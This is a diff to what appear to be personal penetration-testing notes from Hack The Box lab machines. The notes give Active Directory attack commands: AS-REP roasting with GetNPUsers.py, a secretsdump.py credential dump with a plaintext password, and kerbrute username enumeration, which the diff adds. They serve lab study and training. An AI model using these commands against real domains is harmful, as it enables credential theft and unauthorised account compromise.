@@ -7,6 +7,10 @@
 # AS-REPROASTING - finding account which have the property “Do not require Kerberos preauthentication” or UF_DONT_REQUIRE_PREAUTH set to true
     (Attacker request TGT, in the response of KDC, contains a piece of information encrypted with the hash of the user account (will crack it), namely the encrypted session key, the TGT is encrypted with the hash of the ticketing account (kbrtgt) )
     - GetNPUsers.py htb.local/ -no-pass -usersfile user.txt -dc-ip 10.10.16.2
-    - $for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done 
+    - $for user in $(cat user.txt); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done
+===================================================================================================================     
 # get credentials
     - secretsdump.py EGOTISTICAL-BANK.LOCAL/'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175
+===================================================================================================================
+# kerbrute: To enumerate usernames, Kerbrute sends TGT requests with no pre-authentication. If the KDC responds with a PRINCIPAL UNKNOWN error, the username does not exist. However, if the KDC prompts for pre-authentication, we know the username exists and we move on. This does not cause any login failures so it will not lock out any accounts
+    - kerbrute userenum -d EGOTISTICAL-BANK.LOCAL /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.175
